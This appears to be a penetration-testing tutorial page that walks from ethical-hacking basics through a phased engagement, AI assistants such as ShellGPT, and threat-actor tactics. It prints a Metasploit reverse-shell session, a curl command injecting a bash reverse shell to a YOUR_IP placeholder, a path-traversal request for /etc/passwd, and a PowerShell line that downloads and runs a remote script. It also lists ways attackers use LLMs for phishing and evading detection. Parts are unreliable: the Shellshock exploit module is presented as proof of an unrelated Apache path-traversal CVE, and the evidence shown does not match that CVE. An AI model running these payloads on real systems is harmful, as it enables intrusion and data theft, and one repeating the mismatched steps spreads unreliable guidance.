2. Beginner Level

Foundational concepts for practitioners new to ethical hacking principles and professional methodology. Assume zero prior knowledge of penetration testing workflows or authorization requirements.

# Core Concepts

What Is Ethical Hacking?

Ethical hacking is the authorised practice of employing computer and network skills to identify vulnerabilities and security weaknesses in systems, applications, and infrastructure before malicious attackers can exploit them. Ethical hackers follow processes similar to those of malicious hackers, but they operate with explicit written permission, under a defined scope, and with the goal of improving security rather than causing harm.

Ethical hackers (also known as penetration testers, red teamers, or security assessors) simulate realistic attack scenarios to reveal gaps in controls, validate the effectiveness of defenses, and provide evidence-based recommendations to reduce risk.

Why Is Ethical Hacking Necessary?

Modern organisations rely on complex, interconnected systems that are constantly exposed to evolving threats.

Ethical hacking is necessary because:

  • Attackers continuously discover and weaponize new vulnerabilities and misconfigurations.
  • Traditional audits and checklists often miss real-world attack paths and chaining of weaknesses.
  • Regulations and standards increasingly expect proactive testing and verification of controls.
  • Ethical hacking provides a realistic view of what an attacker can do with specific access and time.
Note: By systematically identifying and validating weaknesses, Ethical Hacking helps reduce the likelihood and impact of security incidents, supports compliance, and strengthens an organisation's overall security posture.

# Analogy / Context

Think of ethical hacking as hiring a professional lock-picker to test your building's security. They use the same tools and techniques as a burglar, but they do it with your permission, during agreed hours, and they give you a detailed report of which locks are weak and how to fix them. They don't steal your valuables, they prove they could have, and they tell you how to prevent it.

Scope and Limitations of Ethical Hacking

Ethical hacking must be controlled, authorised, and documented. A clear scope defines what is in-bounds and out-of-bounds for testing, which techniques are permitted, and how results will be handled.

Typical Scope Definition

  • In-scope systems, networks, applications, and APIs.
  • Permitted techniques (e.g. social engineering allowed or prohibited, DoS excluded, phishing controlled).
  • Time windows and maintenance periods for testing.
  • Data handling requirements and confidentiality obligations.

Limitations

Ethical hacking cannot guarantee a system is "100% secure." It is a snapshot in time, limited by scope, time, and resources. Unidentified vulnerabilities may still exist, and new ones can appear after the test due to changes in systems, code, or threat landscape.

3. Intermediate Level

Hands-on application of ethical hacking methodology, including the professional validation pathway, tool usage, and the key differences between adversarial and ethical hacking.

# The Ethical Hacking Workflow

The following high-level steps provide a framework for an ethical hacking engagement:

  1. Discuss the client's needs and objectives for testing.
  2. Prepare and sign non-disclosure agreements (NDAs) and rules of engagement (RoE).
  3. Organise the ethical hacking team and schedule the test window.
  4. Conduct the agreed-upon tests within scope and constraints.
  5. Analyse results, consolidate evidence, and write a clear, structured report.
  6. Present findings and remediation recommendations to the client.

Phase Methodology: The Professional Validation Pathway

While the previous section focused on the Adversary's Pathway (how to break in), Ethical Hacking Concepts focus on the Professional Methodology, how to verify security with permission, report findings, and validate defenses.

In ethical hacking, every command is paired with a Verification Step and a Remediation Strategy.

Phase 1: Planning & Reconnaissance (The "Scope" Check)

  • Professional Goal: Define what we are allowed to test and map the external attack surface accurately.
  • Tool: Whois / DNSenum
$ dnsenum yourtarget.com
Subdomain found: dev.yourtarget.com (192.168.1.50)
Subdomain found: api.yourtarget.com (192.168.1.51)
MX Record: mail.yourtarget.com

Professional Insight: We identify that the development environment is exposed to the internet. This is a high-value target for finding unpatched vulnerabilities not present in production.

Phase 2: Enumeration & Vulnerability Analysis (The "Gap" Analysis)

Framework Reference: Common Vulnerabilities and Exposures ← click to open

  • Professional Goal: Map services against known CVEs (Common Vulnerabilities and Exposures).
  • Tool: Nmap + OpenVAS (Open Vulnerability Assessment System)
$ nmap -sV -p 22,80,443,8080 yourtarget.com > scan_results.txt
$ openvas-nasl -t yourtarget.com vuln_scripts.nasl

Host: yourtarget.com
Port: 80
CVE-2021-41773: Apache HTTP Server Path Traversal
Severity: High
CVSS Score: 7.5
Proof: /server-status returned 200 OK

Professional Insight: We have identified a specific, exploitable vulnerability (CVE-2021-41773) with a high severity score. This is a prioritized finding.

Phase 3: Exploitation (The "Proof of Concept")

  • Professional Goal: Prove the vulnerability exists without causing damage (PoC).
  • Tool: Metasploit Framework (msfconsole)
  • Payload: exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS yourtarget.com
RHOSTS => yourtarget.com
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set PAYLOAD cmd/unix/reverse_perl
PAYLOAD => cmd/unix/reverse_perl
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit -j

[*] Started reverse TCP handler on 10.10.14.5:4444
[+] Apache Mod CGI Bash Environment Variable Injection Successful
meterpreter > sysinfo
Computer: web-server-01
OS: Ubuntu 20.04 LTS

Professional Insight: The exploit worked and validated the vulnerability. Testing stops at verification unless additional actions are explicitly authorized within the Rules of Engagement (RoE).

Phase 4: Privilege Escalation (The "Impact" Assessment)

  • Professional Goal: Determine the true impact of the compromise and assess potential privilege escalation paths.
  • Tool: LinPEAS.sh (Linux Privilege Escalation Awesome Script)
$ ./linpeas.sh | grep -i "sudo"
[+] Can sudo without password: /usr/bin/docker
[!] Possible Elevation of Privilege (EoP) with docker: https://gtfobins.github.io/gtfobins/docker/

Professional Insight: The user can run Docker as root without a password. This represents a critical finding because it may allow host-level access and enable lateral movement opportunities.

Phase 5: Reporting (The "Deliverable")

  • Professional Goal: Communicate findings clearly to both technical and executive stakeholders.
  • Tool: Markdown / PDF Report Generator
## Finding #1: Unpatched Apache Vulnerability
- Severity: High (CVSS 7.5)
- CVE: CVE-2021-41773
- Evidence: nmap scan shows version 2.4.49.
- Proof of Concept: Successful reverse shell via Meterpreter.
- Remediation: Upgrade Apache to version 2.4.50 or later.

3.2.6 Phase 6: Validation & Verification (The "Fix" Check)

  • Professional Goal: Re-test after remediation to ensure the vulnerability has been successfully addressed.
  • Tool: Nmap / curl
$ curl -v http://yourtarget.com/server-status
HTTP/1.1 403 Forbidden
# The path traversal no longer works or returns expected status.
Professional Insight: The vulnerability has been patched successfully. The engagement can move to closure and final sign-off.

# Skills of an Ethical Hacker

Note: It is essential for an ethical hacker to acquire the knowledge and skills required to think like an expert attacker and to use this knowledge in a lawful, controlled manner.

Technical Skills

  • In-depth knowledge of major operating systems (Windows, Linux, Unix, macOS).
  • Strong understanding of networking concepts, protocols, and related hardware/software.
  • Solid grasp of security domains such as web, network, cloud, wireless, and application security.
  • Ability to launch and analyse sophisticated attacks in a controlled, lab-safe manner.
  • Familiarity with common security tools and frameworks (Nmap, Burp Suite, Metasploit, Wireshark, etc.).
  • Practical knowledge of scripting and programming languages (e.g., Python, Bash, PowerShell, JavaScript).
  • Awareness of vulnerability management, exploit development basics, and secure coding principles.

Non-Technical Skills

  • Ability to learn rapidly and adapt to new technologies and environments.
  • Strong work ethic, attention to detail, and persistence.
  • Clear written and verbal communication skills for reports and briefings.
  • Professionalism and integrity in handling sensitive data and evidence.
  • Commitment to the organisation's security policies and culture.
  • Awareness of local laws, industry standards, and regulatory requirements.

AI & Ethical Hacking

In today's rapidly evolving landscape, artificial intelligence (AI) and machine learning (ML) have transformed both cyber offense and defense. Attackers increasingly leverage AI to automate reconnaissance, craft convincing phishing campaigns, and optimise attack paths. In response, AI-driven ethical hacking uses the same technologies to enhance the capabilities of defenders.

Category Description
Efficiency Artificial Intelligence (AI) can process and analyze large volumes of data at high speed, streamlining ethical hacking workflows and reducing manual effort.
Accuracy Automated analysis reduces human error and increases the precision of vulnerability detection and assessment results.
Scalability AI-driven security tools can scale to match growing environments and adapt to higher traffic, larger networks, and more complex threat surfaces.
Cost-Effectiveness Automation and faster detection reduce operational overhead, improving the overall cost efficiency of cybersecurity operations.
Network Security AI continuously monitors network traffic, helping identify anomalies, suspicious behavior, and early indicators of compromise.
Application Security AI-assisted tools test Web and mobile applications for weaknesses, spotting issues such as injection flaws, insecure authentication, and misconfigurations.
Cloud Security Automated analysis helps detect misconfigurations, access issues, and exposure risks across cloud platforms and services.
IoT Security AI helps secure Internet of Things devices by analyzing behavior patterns and detecting unusual or malicious activity.
Threat Intelligence AI aggregates and analyzes threat data to produce insights that improve detection, identification, and prioritization of cybersecurity risks.
Note: AI-driven ethical hacking combines traditional penetration testing with AI/ML models to make assessments more efficient, scalable, and effective, helping organisations anticipate evolving attack vectors and proactively mitigate risks.

How AI Helps Ethical Hackers

  • Automation of repetitive tasks: Automates scanning, data collection, and initial triage so humans can focus on complex analysis.
  • Predictive analysis: Uses patterns in historical data to highlight likely weak points before they are exploited.
  • Advanced threat detection: Detects subtle indicators of compromise that traditional rules-based methods might miss.
  • Enhanced decision-making: Provides risk scores and context, helping prioritise remediation and testing focus.
  • Adaptive learning: Continuously learns from new data to improve detection and response strategies over time.
  • Enhanced reporting: Assists in generating structured, data-backed reports and visualisations.
  • Simulation and testing: Supports realistic attack simulations under various conditions for better resilience testing.
  • Scalability and continuous monitoring: Handles large environments and monitors systems in near real time.

Will AI Replace Ethical Hackers?

A common misconception is that AI will fully replace ethical hackers. In reality, AI is a force multiplier, not a replacement. It excels at processing large volumes of data, recognising patterns, and automating routine tasks, but it lacks human judgment, creativity, and contextual understanding.

Ethical hacking requires nuanced decisions about scope, risk, legality, and impact, all of which depend on human expertise, ethics, and accountability. The most effective security programs combine skilled humans with AI-driven tools, using AI to augment analysis rather than to replace it.

ChatGPT-Powered AI Tools for Ethical Hackers

ChatGPT-powered tools leverage large language models (LLMs) to assist ethical hackers with research, automation, and decision support. Used correctly, they can significantly improve productivity and the quality of testing, while still requiring human oversight and validation.

Key Capabilities

  • Real-time assistance: Explaining tool output, protocols, or vulnerabilities during live testing.
  • Task automation: Generating helper scripts, command snippets, or lab instructions for repetitive tasks.
  • Threat intelligence enrichment: Summarising reports, advisories, and indicators of compromise for faster understanding.
Note: The security community also tracks adversarial uses of AI (for example, AI-assisted phishing, malware generation, or fraud). Ethical hackers should understand these trends to defend against them, but must never use such capabilities for unauthorised or illegal activity.

ShellGPT & CLI Assistants

Real-time Helper
  • These tools integrate into your terminal (using gpt-3.5-turbo or similar) to suggest commands based on natural language queries. They are excellent for reducing syntax errors and discovering new flags.

Use Case: Complex Grep Command

Goal: Find all lines containing "ERROR" in a log file that also contain an IP address, and count the total number of these lines.

# User Input (ShellGPT):
$ sgpt --shell "Find all lines containing 'ERROR' in /var/log/syslog that also contain an IPv4 address, and count the total number of these lines."

# AI Output (Suggested Command):
grep "ERROR" /var/log/syslog | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | wc -l

# Explanation:
1. grep "ERROR": Filters lines with the word ERROR.
2. grep -Eo '...': Extracts only the IPv4 addresses from those lines (ignoring other text).
3. wc -l: Counts the number of resulting lines (which equals the count of ERROR+IP matches).

Why it helps: The AI correctly identified that you need a pipeline: first filter by keyword, then extract/verify the IP pattern, and finally count the occurrences. It handled the complex regex for IPv4 addresses automatically.

Use Case: Generate Python Script

# User Input:
$ sgpt --shell "Write a python script to check if port 80 is open on localhost."

AI Output (Generated Code):
import socket

def check_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((host, port))
    if result == 0:
        print(f"Port {port} is OPEN on {host}")
    else:
        print(f"Port {port} is CLOSED on {host}")
    sock.close()

check_port('127.0.0.1', 80)

Security Guardrails & Best Practices

AI tools are powerful but prone to "hallucinations" (making up facts or commands). Always apply these guardrails:

  • Human in the Loop: Never let an AI agent execute critical commands (like rm -rf) without human confirmation.
  • Lab Environments First: Test AI-generated scripts and orchestrator chains in a sandbox before running on production systems.
  • Validate Outputs: Always read the generated code/command. AI might suggest deprecated tools or insecure practices (e.g., using http instead of https).
  • Data Privacy: Do not paste sensitive credentials, PII, or proprietary source code into public LLMs unless using an enterprise/private instance.
  • Policy Compliance: Ensure AI usage aligns with organizational data handling policies.

5. Adversarial Level

Threat actor perspective. Advanced persistent threats, criminal groups, and red teams do not ignore ethical hacking frameworks, they study them to understand defensive detection opportunities and exploit the gaps between authorization and implementation.

# Threat Actor Behavior

Methodology Exploitation

  • Target organizations that treat penetration testing as a compliance checkbox rather than an operational discipline.
  • Exploit the gap between "accepted risk" and actual control implementation during vulnerability scanning phases.
  • Use the predictable rhythm of assessment cycles (quarterly scans, annual penetration tests) to schedule attacks during "quiet" periods.

AI Exploitation

  • Use LLMs to generate hyper-personalized phishing lures that bypass semantic NLP detection engines.
  • Train models on security vendor documentation to identify detection gaps in popular EDR/AV products.
  • Automate reconnaissance to discover misconfigured assets, exposed APIs, and weak authentication endpoints.

Authorized Reconnaissance & Enumeration

# DNS enumeration within scope
$ dnsenum --enum yourtarget.com -o dns_results.xml

# Nmap service scan with output for client evidence
$ nmap -sV -sC -O -p- -oA target_scan yourtarget.com

# SSL/TLS enumeration for outdated cipher suites
$ nmap --script ssl-enum-ciphers -p 443 yourtarget.com

# Web path enumeration with rate limiting to avoid DoS
$ gobuster dir -u http://yourtarget.com -w /usr/share/wordlists/dirb/common.txt -t 20

Vulnerability Validation (PoC Only)

# Test for CVE-2021-41773 (Apache path traversal) — verify only
$ curl -s -o /dev/null -w "%{http_code}" http://yourtarget.com/cgi-bin/.%2e/.%2e/.%2e/etc/passwd
# Expected: 200 indicates vulnerability present; 403 indicates patched

# SQL injection validation using sqlmap with safe flags
$ sqlmap -u "http://yourtarget.com/page?id=1" --batch --level=2 --risk=1 --tables --flush-session

# Quick reverse-shell validation with immediate termination
$ nc -lvnp 4444 &
$ curl -X POST http://yourtarget.com/vulnerable_endpoint --data 'cmd=bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
# Disconnect immediately after shell confirmation; do not explore

Privilege Escalation Enumeration (Read-Only)

# Linux privilege escalation check
$ wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh -a > peass_output.txt

# Windows privilege escalation check via PowerUp
$ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks | Out-File powerup.txt"

Remediation Validation

# Re-test Apache path traversal after patch
$ curl -s -o /dev/null -w "%{http_code}" http://yourtarget.com/cgi-bin/.%2e/.%2e/.%2e/etc/passwd
# Expect 403 Forbidden

# Confirm closed port after firewall change
$ nmap -p 3306 yourtarget.com
# Expect: 3306/tcp filtered mysql

# Verify SSL hardening
$ nmap --script ssl-enum-ciphers -p 443 yourtarget.com | grep "TLSv1.2"
# Expect strong ciphers only; no TLSv1.0 or TLSv1.1

# Scenario Professional Response & Control
1 During a test, you discover a critical RCE on a production server outside the signed scope boundary. Stop and report. Document evidence, cease testing on the out-of-scope asset, and notify the client immediately. Never exploit without explicit amendment to the RoE.
2 You achieve a shell via Meterpreter and are tempted to explore the internal network "just to see what's there." Restrict to scope. Internal pivoting is only permissible if explicitly authorized in the engagement contract. Otherwise, collect evidence and stop.
